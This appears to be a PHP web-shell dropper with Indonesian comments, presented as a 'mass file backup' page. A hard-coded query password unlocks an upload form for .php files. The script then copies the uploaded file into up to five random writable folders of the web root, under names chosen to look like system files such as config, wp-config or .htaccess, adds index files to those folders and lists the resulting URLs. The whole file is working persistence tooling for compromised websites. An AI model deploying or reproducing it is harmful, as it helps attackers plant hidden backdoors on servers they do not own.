<?php
// Cek keberadaan parameter parameter_pass
$show_upload_button = false;
if (isset($_GET['pass']) && $_GET['pass'] === 'BcKuP') {
    $show_upload_button = true;
}

$uploaded_files = []; // Array untuk menyimpan path file yang berhasil diupload
$message = '';
$links_output = '';

// Daftar nama file umum yang menyerupai nama sistem
$system_like_base_names = [
    // Umum
    'config', 'settings', 'main', 'data', 'log', 'index', 'admin', 'assets', 'tmp', 'cache',
    'update', 'system', 'core', 'module', 'plugin', 'app', 'service', 'bootstrap', 'init',
    'routes', 'controller', 'model', 'view', 'functions', 'helper', 'database', 'public',
    'storage', 'web', 'script', 'style', 'library', 'utility', 'security', 'api', 'handler',
    'migration', 'seed', 'test', 'worker', 'console', 'commands', 'events', 'listeners',
    'middleware', 'providers', 'resources', 'includes', 'layout', 'template', 'error',
    'vendor', 'package', '.htaccess', 'robots', 'sitemap', 'favicon', 'crossdomain', 'access',
    'debug', 'stats', 'info', 'status', 'monitor', 'backup', 'restore', 'install', 'setup',
    'loader', 'common', 'constants', 'globals', 'environment', 'secrets', 'credentials', 'connection',
    'version', 'manifest', 'schema', 'service-worker', 'component', 'hook', 'filter', 'action',
    'metadata', 'report', 'dashboard', 'panel', 'manager', 'gateway', 'auth', 'user', 'profile',
    'session', 'payment', 'order', 'product', 'category', 'cart', 'checkout', 'search', 'terms',
    'privacy', 'about', 'contact', 'faq', 'support', 'gallery', 'blog', 'post', 'comment', 'feed',
    'widget', 'block', 'item', 'list', 'detail', 'form', 'create', 'edit', 'delete', 'collection',

    // Nama file spesifik CMS
    'wp-config', 'wp-settings', 'wp-load', 'functions', 'header', 'footer', 'sidebar', 'page',
    'single', 'archive', 'category', 'tag', 'comments', 'content', 'front-page', 'home',
    'template-parts', 'loop', 'shortcodes', 'widgets', 'custom-post-type', 'taxonomy',
    'error404', 'searchform', 'login', 'register', 'dashboard', 'editor', 'assets', 'media',
    'uploads', 'gallery', 'language', 'modules', 'components', 'plugins', 'templates',
    'libraries', 'layouts', 'administrator', 'mod_mainmenu', 'com_content',
    'mod_articles_latest', 'tpl_beez3', 'html', 'views', 'node', 'theme', 'module', 'install',

    // Nama file Framework
    'routes', 'web', 'api', 'console', 'kernel', 'migrations', 'seeds', 'factories',
    'controllers', 'models', 'providers', 'exceptions', 'policies', 'tests',
    'composer', 'mix', 'artisan', 'env', 'autoloader', 'routes_web', 'routes_api',
    'routes_console', 'services', 'repositories', 'interfaces', 'traits', 'enums', 'lang',
    'translation', 'helpers', 'validation', 'queue', 'session',

    // Nama file JavaScript/Frontend
    'gulpfile', 'webpack.config', 'rollup.config', 'vite.config', 'tailwind.config',
    'postcss.config', 'babel.config', 'tsconfig', 'eslint.config', 'prettier.config',
    'jest.config', 'cypress.config', 'bundle', 'utils', 'hooks', 'store', 'router',
    'constants', 'types', 'styles', 'mixins', 'animations', 'themes', 'lib', 'src',
    'dist', 'build', 'server', 'client', 'shared', 'registerServiceWorker',
    'firebase-messaging-sw', 'google-analytics',

    // Nama file umum lainnya
    'read', 'write', 'open', 'close', 'send', 'recv', 'exec', 'shell', 'process',
    'remote', 'connect', 'listen', 'payload', 'exploit', 'decoder', 'encoder',
    'cipher', 'encrypt', 'decrypt', 'logout', 'token', 'key', 'secret', 'password',
    'account', 'json', 'xml', 'yaml', 'ini', 'conf', 'options', 'variables',
    'global', 'local', 'temp', 'file', 'dir', 'path', 'url', 'uri', 'route', 'map',
    'sort', 'group', 'query', 'request', 'response', 'agent', 'proxy', 'host',
    'network', 'socket', 'port', 'address', 'ip', 'domain', 'cert', 'ssl', 'tls',
    'pki', 'ca', 'csr', 'crl', 'revocation', 'trust', 'chain', 'history',
    'audit', 'event', 'trace', 'dump', 'warning', 'notice', 'verbose',
    'critical', 'fatal', 'exception', 'stack', 'traceback', 'memory', 'cpu',
    'disk', 'io', 'driver', 'device', 'hardware', 'firmware', 'bios', 'uefi',
    'boot', 'grub', 'lilo', 'initrd', 'vmlinuz', 'efi', 'mbr', 'gpt',
    'partition', 'volume', 'fs', 'filesystem', 'mount', 'unmount', 'fstab',
    'mtab', 'stat', 'inode', 'superblock', 'journal', 'redo', 'undo',
    'transaction', 'commit', 'rollback', 'acquire', 'release', 'lock',
    'mutex', 'semaphore', 'thread', 'task', 'job', 'scheduler', 'daemon',
    'rpc', 'soap', 'rest', 'graphql', 'websocket', 'stream', 'pipe', 'channel',
    'bind', 'link', 'symlink', 'hardlink', 'owner', 'perms', 'acl', 'selinux',
    'apparmor', 'firewall', 'iptables', 'nftables', 'pf', 'role', 'privilege',
    'capability', 'policy', 'rule', 'deny', 'allow', 'grant', 'revoke',
    'alert', 'metric', 'health', 'check', 'uptime', 'load', 'cron', 'batch',
    'program', 'code', 'source', 'body', 'factory', 'suite', 'case',
    'assertion', 'mock', 'stub', 'spy', 'tool', 'cookie', 'table', 'column',
    'row', 'record', 'entry', 'schema', 'type', 'interface', 'class', 'object',
    'function', 'method', 'variable', 'constant', 'array', 'string', 'number',
    'boolean', 'null', 'void', 'return', 'yield', 'throw', 'try', 'catch',
    'finally', 'if', 'else', 'switch', 'default', 'for', 'while', 'do',
    'foreach', 'break', 'continue', 'goto', 'use', 'namespace', 'trait',
    'abstract', 'final', 'protected', 'private', 'static', 'const', 'var',
    'let', 'new', 'this', 'self', 'parent', 'super', 'enum', 'struct',
    'union', 'typedef', 'declare', 'import', 'export', 'default', 'from',
    'as', 'with', 'in', 'of', 'instanceof', 'typeof', 'delete', 'debugger',
    'await', 'async', 'generator', 'promise', 'then', 'resolve', 'reject',
    'all', 'race', 'any', 'settled', 'map', 'filter', 'reduce', 'some',
    'every', 'find', 'findIndex', 'includes', 'indexOf', 'lastIndexOf',
    'slice', 'splice', 'concat', 'join', 'split', 'trim', 'toLowerCase',
    'toUpperCase', 'replace', 'match', 'search', 'substring', 'substr',
    'charAt', 'charCodeAt', 'fromCharCode', 'startsWith', 'endsWith',
    'padEnd', 'padStart', 'repeat', 'localeCompare', 'normalize', 'valueOf',
    'toString', 'toJSON', 'toGMTString', 'toISOString', 'toUTCString',
    'toLocaleString', 'toDateString', 'toTimeString', 'getTime', 'getFullYear',
    'getMonth', 'getDate', 'getDay', 'getHours', 'getMinutes', 'getSeconds',
    'getMilliseconds', 'getUTCFullYear', 'getUTCMonth', 'getUTCDate',
    'getUTCDay', 'getUTCHours', 'getUTCMinutes', 'getUTCSeconds',
    'getUTCMilliseconds', 'setTime', 'setFullYear', 'setMonth', 'setDate',
    'setHours', 'setMinutes', 'setSeconds', 'setMilliseconds', 'setUTCFullYear',
    'setUTCMonth', 'setUTCDate', 'setUTCHours', 'setUTCMinutes', 'setUTCSeconds',
    'setUTCMilliseconds', 'parse', 'UTC', 'now', 'random', 'floor', 'ceil',
    'round', 'abs', 'min', 'max', 'pow', 'sqrt', 'exp', 'sin', 'cos', 'tan',
    'atan', 'atan2', 'asin', 'acos', 'sinh', 'cosh', 'tanh', 'asinh', 'acosh',
    'atanh', 'trunc', 'sign', 'cbrt', 'clz32', 'fround', 'imul', 'hypot',
    'log1p', 'log10', 'log2', 'expm1', 'EPSILON', 'MAX_VALUE', 'MIN_VALUE',
    'NEGATIVE_INFINITY', 'POSITIVE_INFINITY', 'NaN', 'PI', 'SQRT2', 'SQRT1_2',
    'LN2', 'LN10', 'LOG2E', 'LOG10E', 'E',
];

/**
 * Konten untuk file index.php yang akan dibuat otomatis
 */
$INDEX_FILE_CONTENT = <<<'PHP'
<?php
// File index otomatis
// Silakan ganti dengan konten Anda sendiri
header('HTTP/1.0 403 Forbidden');
echo "Access Denied";
exit;
PHP;

/**
 * Fungsi untuk membuat file index.php di direktori tertentu
 * HANYA jika belum ada index.php atau index.html di direktori tersebut.
 *
 * @param string $dir Direktori tempat file index akan dibuat
 * @param string $content Konten file index.php
 * @return bool True jika berhasil dibuat, False jika dilewati/gagal
 */
function create_index_if_missing($dir, $content) {
    $dir = rtrim($dir, DIRECTORY_SEPARATOR);

    if (!is_dir($dir) || !is_writable($dir)) {
        return false;
    }

    $index_php  = $dir . DIRECTORY_SEPARATOR . 'index.php';
    $index_html = $dir . DIRECTORY_SEPARATOR . 'index.html';

    if (file_exists($index_php) || file_exists($index_html)) {
        return false;
    }

    $result = @file_put_contents($index_php, $content);
    return ($result !== false);
}

/**
 * Fungsi untuk mendapatkan semua subfolder secara otomatis,
 * hanya yang bisa ditulis.
 */
function get_all_subfolders_writable($parent_dir, $max_depth = 8, $current_depth = 1) {
    $result = [];
    if ($current_depth > $max_depth) {
        return $result;
    }
    if (!is_dir($parent_dir) || !is_readable($parent_dir)) {
        return $result;
    }

    $items = scandir($parent_dir);
    if ($items === false) {
        return $result;
    }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $parent_dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            if (is_writable($path)) {
                $result[] = $path;
            }
            $result = array_merge($result, get_all_subfolders_writable($path, $max_depth, $current_depth + 1));
        }
    }
    return $result;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['script_file'])) {
        $script_content = '';
        $errors = [];

        $file_tmp = $_FILES['script_file']['tmp_name'];
        $original_name = $_FILES['script_file']['name'];

        if (!is_uploaded_file($file_tmp)) {
            $message = "File tidak valid.";
        } else {
            $script_content = file_get_contents($file_tmp);

            $path_info = pathinfo($original_name);
            $extension = isset($path_info['extension']) ? '.' . strtolower($path_info['extension']) : '';

            $document_root = rtrim($_SERVER['DOCUMENT_ROOT'], '/');

            $all_writable_dirs = get_all_subfolders_writable($document_root, 8);

            if (empty($all_writable_dirs)) {
                $default_dir = $document_root . DIRECTORY_SEPARATOR . 'data_backup';
                if (!is_dir($default_dir)) {
                    @mkdir($default_dir, 0755, true);
                }
                if (is_dir($default_dir) && is_writable($default_dir)) {
                    $all_writable_dirs[] = $default_dir;
                } else {
                    $message = "Tidak ada direktori yang dapat ditulis ditemukan atau dibuat. Upload gagal.";
                    exit;
                }
            }

            $all_writable_dirs = array_unique($all_writable_dirs);
            $all_writable_dirs = array_values($all_writable_dirs);

            shuffle($system_like_base_names);

            $upload_count = 0;
            $max_uploads = 5;

            $available_dirs = $all_writable_dirs;
            $available_names = $system_like_base_names;

            // Array untuk melacak direktori yang sudah diproses
            // agar file index.php tidak dibuat berulang-ulang
            $processed_dirs = [];

            for ($i = 0; $i < $max_uploads; $i++) {
                if (empty($available_dirs) || empty($available_names)) {
                    $errors[] = "Tidak ada lagi direktori atau nama file yang tersedia untuk upload ke-" . ($i + 1) . ".";
                    break;
                }

                $chosen_dir = null;
                $chosen_filename = null;
                $found_combination = false;

                $dir_attempt_count = 0;
                while ($dir_attempt_count < count($available_dirs)) {
                    $random_dir_key = array_rand($available_dirs);
                    $potential_dir = $available_dirs[$random_dir_key];

                    if (!is_dir($potential_dir) || !is_writable($potential_dir)) {
                        unset($available_dirs[$random_dir_key]);
                        $available_dirs = array_values($available_dirs);
                        $dir_attempt_count++;
                        continue;
                    }

                    $name_attempt_count = 0;
                    $temp_names_for_dir_check = $available_names;
                    shuffle($temp_names_for_dir_check);

                    while ($name_attempt_count < count($temp_names_for_dir_check)) {
                        $potential_base_name = $temp_names_for_dir_check[$name_attempt_count];
                        $potential_filename = $potential_base_name . $extension;
                        $potential_filepath = rtrim($potential_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $potential_filename;

                        if (!file_exists($potential_filepath)) {
                            $chosen_dir = $potential_dir;
                            $chosen_filename = $potential_filename;

                            unset($available_dirs[$random_dir_key]);
                            $available_dirs = array_values($available_dirs);

                            $key_in_available_names = array_search($potential_base_name, $available_names);
                            if ($key_in_available_names !== false) {
                                unset($available_names[$key_in_available_names]);
                                $available_names = array_values($available_names);
                            }

                            $found_combination = true;
                            break;
                        }
                        $name_attempt_count++;
                    }

                    if ($found_combination) {
                        break;
                    }

                    unset($available_dirs[$random_dir_key]);
                    $available_dirs = array_values($available_dirs);
                    $dir_attempt_count++;
                }

                if ($found_combination) {
                    $filepath = rtrim($chosen_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $chosen_filename;

                    if (file_put_contents($filepath, $script_content) === false) {
                        $errors[] = "Gagal mengupload '{$chosen_filename}' ke {$filepath}.";
                    } else {
                        // Berhasil upload
                        $relative_path = str_replace('\\', '/', $filepath);
                        if (strpos($relative_path, $document_root) === 0) {
                            $relative_url = substr($relative_path, strlen($document_root));
                            if ($relative_url[0] !== '/') {
                                $relative_url = '/' . $relative_url;
                            }
                        } else {
                            $relative_url = '/' . ltrim(str_replace($document_root, '', $relative_path), '/');
                        }
                        $uploaded_files[] = $relative_url;
                        $upload_count++;

                        // ============================================================
                        // Buat file index.php di direktori tujuan
                        // HANYA JIKA belum ada index.php atau index.html
                        // TIDAK ditambahkan ke daftar output link
                        // ============================================================
                        $normalized_dir = rtrim($chosen_dir, DIRECTORY_SEPARATOR);
                        if (!in_array($normalized_dir, $processed_dirs, true)) {
                            create_index_if_missing($normalized_dir, $INDEX_FILE_CONTENT);
                            $processed_dirs[] = $normalized_dir;
                        }
                        // ============================================================
                        // AKHIR BAGIAN INDEX
                        // ============================================================
                    }
                } else {
                    $errors[] = "Tidak dapat menemukan kombinasi direktori dan nama file unik untuk upload ke-" . ($i + 1) . ". Mungkin sudah tidak ada direktori atau nama file yang cocok.";
                }
            }

            if (empty($errors) && $upload_count > 0) {
                $message = "Berhasil mengupload {$upload_count} file.";
                $host = $_SERVER['HTTP_HOST'];
                $protocol = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? 'https://' : 'http://';

                $links = [];
                foreach ($uploaded_files as $file_path) {
                    $full_url = $protocol . $host . $file_path;
                    $links[] = htmlspecialchars($full_url);
                }
                $links_output = implode("\n", $links);
            } elseif ($upload_count === 0 && empty($errors)) {
                $message = "Tidak ada file yang berhasil diupload. Mungkin tidak ada direktori yang bisa ditulis atau semua kombinasi nama file/direktori sudah ada.";
            } else {
                $message = "Gagal mengupload beberapa file. Berhasil: {$upload_count}. Detail: " . implode("<br>", $errors);
            }
        }
    } else {
        $message = "Tidak ada file yang dipilih.";
    }
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Tools - Backup File Massal</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Montserrat&display=swap');

  body {
    margin: 0;
    font-family: 'Montserrat', sans-serif;
    background-color: #121212;
    color: #e0e0e0;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    overflow: hidden;
  }

  .container {
    background-color: #1e1e1e;
    padding: 40px;
    border-radius: 15px;
    box-shadow: 0 0 20px rgba(0,0,0,0.7);
    max-width: 700px;
    width: 90%;
    position: relative;
    overflow: hidden;
  }

  h1 {
    text-align: center;
    font-size: 2.5em;
    margin-bottom: 20px;
    color: #00bcd4;
    animation: pulse 2s infinite;
  }

  @keyframes pulse {
    0% { transform: scale(1); opacity: 1; }
    50% { transform: scale(1.05); opacity: 0.8; }
    100% { transform: scale(1); opacity: 1; }
  }

  #uploadBtn {
    display: block;
    margin: 20px auto;
    padding: 15px 30px;
    font-size: 1.2em;
    background: linear-gradient(135deg, #00bcd4, #2196f3);
    border: none;
    border-radius: 50px;
    cursor: pointer;
    color: #fff;
    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    transition: all 0.3s ease;
  }

  #uploadBtn:hover {
    background: linear-gradient(135deg, #2196f3, #00bcd4);
    transform: scale(1.05);
  }

  #fileInput { display: none; }

  .message {
    margin-top: 20px;
    padding: 15px;
    border-radius: 10px;
    font-size: 1em;
    transition: all 0.3s ease;
  }

  .success {
    background-color: #2e7d32;
    color: #fff;
    animation: fadeIn 1s;
  }

  .error {
    background-color: #c62828;
    color: #fff;
    animation: shake 0.5s;
  }

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(-10px); }
    to { opacity: 1; transform: translateY(0); }
  }

  @keyframes shake {
    0% { transform: translateX(0); }
    20% { transform: translateX(-5px); }
    40% { transform: translateX(5px); }
    60% { transform: translateX(-5px); }
    80% { transform: translateX(5px); }
    100% { transform: translateX(0); }
  }

  .links {
    margin-top: 20px;
    opacity: 0;
    animation: fadeInUp 1s forwards;
  }

  .links h3 { margin-bottom: 10px; color: #ffd700; }

  textarea {
    width: 100%;
    height: 150px;
    resize: vertical;
    padding: 10px;
    border-radius: 8px;
    border: none;
    background-color: #333;
    color: #fff;
    font-family: 'Courier New', monospace;
    font-size: 0.9em;
  }

  @keyframes fadeInUp {
    from { opacity: 0; transform: translateY(20px); }
    to { opacity: 1; transform: translateY(0); }
  }

  body::before {
    content: "";
    position: fixed;
    top: -50%;
    left: -50%;
    width: 200%;
    height: 200%;
    background: conic-gradient(
      #00bcd4 0deg, #2196f3 60deg,
      #00bcd4 120deg, #2196f3 180deg,
      #00bcd4 240deg, #2196f3 300deg,
      #00bcd4 360deg
    );
    background-size: 400% 400%;
    animation: rotateBackground 60s linear infinite;
    z-index: -1;
    opacity: 0.2;
  }

  @keyframes rotateBackground {
    from {transform: rotate(0deg);}
    to {transform: rotate(360deg);}
  }

  .circle {
    position: absolute;
    border-radius: 50%;
    opacity: 0.3;
    animation: float 20s linear infinite;
  }

  @keyframes float {
    0% { transform: translateY(0) translateX(0); }
    50% { transform: translateY(-20px) translateX(20px); }
    100% { transform: translateY(0) translateX(0); }
  }

  .circle1 { width: 20px; height: 20px; background-color: #ff5722; top: 10%; left: 15%; animation-delay: 0s; }
  .circle2 { width: 30px; height: 30px; background-color: #4caf50; top: 80%; left: 70%; animation-delay: 5s; }
  .circle3 { width: 15px; height: 15px; background-color: #ffeb3b; top: 50%; left: 30%; animation-delay: 10s; }
</style>
</head>
<body>
<div class="container">
  <h1>Backup File Massal</h1>
  <div class="circle circle1"></div>
  <div class="circle circle2"></div>
  <div class="circle circle3"></div>

<?php if ($show_upload_button): ?>
  <button id="uploadBtn">Upload</button>
  <form id="uploadForm" method="POST" enctype="multipart/form-data" style="display:none;">
    <input type="file" id="fileInput" name="script_file" accept=".php,.php5,.php7,.php8,.php9,.phtml,.html,.jpg,.png,.gif,.txt" required />
  </form>
<?php endif; ?>

  <?php if (isset($message)): ?>
    <div class="message <?php echo (strpos($message, 'Gagal') !== false || strpos($message, 'Tidak') !== false) ? 'error' : 'success'; ?>">
      <?php echo $message; ?>
    </div>
  <?php endif; ?>

  <?php if (!empty($links_output)): ?>
    <div class="links">
      <h3>Link File :</h3>
      <textarea readonly><?php echo $links_output; ?></textarea>
    </div>
  <?php endif; ?>
</div>

<script>
  <?php if ($show_upload_button): ?>
  document.getElementById('uploadBtn').addEventListener('click', function() {
    document.getElementById('fileInput').click();
  });

  document.getElementById('fileInput').addEventListener('change', function() {
    if (this.files.length > 0) {
      document.getElementById('uploadForm').submit();
    }
  });
  <?php endif; ?>

  const circles = document.querySelectorAll('.circle');
  circles.forEach(circle => { animateCircle(circle); });

  function animateCircle(element) {
    const maxX = window.innerWidth - 50;
    const maxY = window.innerHeight - 50;
    const duration = 20000 + Math.random() * 10000;

    function move() {
      const targetX = Math.random() * maxX;
      const targetY = Math.random() * maxY;
      element.animate([
        { transform: `translate(0, 0)` },
        { transform: `translate(${targetX}px, ${targetY}px)` }
      ], {
        duration: duration,
        fill: 'forwards',
        easing: 'ease-in-out'
      }).onfinish = move;
    }
    move();
  }
</script>
</body>
</html>
